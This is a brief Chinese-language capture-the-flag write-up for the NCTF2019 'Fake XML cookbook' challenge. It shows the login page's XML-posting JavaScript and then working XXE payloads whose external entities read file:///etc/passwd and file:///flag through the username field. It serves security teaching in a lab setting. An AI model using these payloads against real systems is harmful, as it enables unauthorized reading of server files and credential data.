### [NCTF2019]Fake XML cookbook

----

> 复现平台：BUUCTF
>
> 类型：xxe

进入界面，一个登录界面，看一下源代码，其中发现登录数据的上传是xml格式

```js
function doLogin(){
	var username = $("#username").val();
	var password = $("#password").val();
	if(username == "" || password == ""){
		alert("Please enter the username and password!");
		return;
	}
	
	var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin.php",
        contentType: "application/xml;charset=utf-8",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
        	if(code == "0"){
        		$(".msg").text(msg + " login fail!");
        	}else if(code == "1"){
        		$(".msg").text(msg + " login success!");
        	}else{
        		$(".msg").text("error:" + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    }); 
}
```

尝试xml，Payload：

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY att SYSTEM "file:///etc/passwd"> ]>
<user><username>name</username><password>&att;</password></user>

#没有出现预期数据

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY att SYSTEM "file:///etc/passwd"> ]>
<user><username>&att;</username><password>123456</password></user>

<?xml version="1.0" ?>
<!DOCTYPE Payload [
<!ENTITY file SYSTEM  "file:///flag">
]>
<user>
	<username>&file;</username>
	<password>1</password>
</user>
```

发包得到flag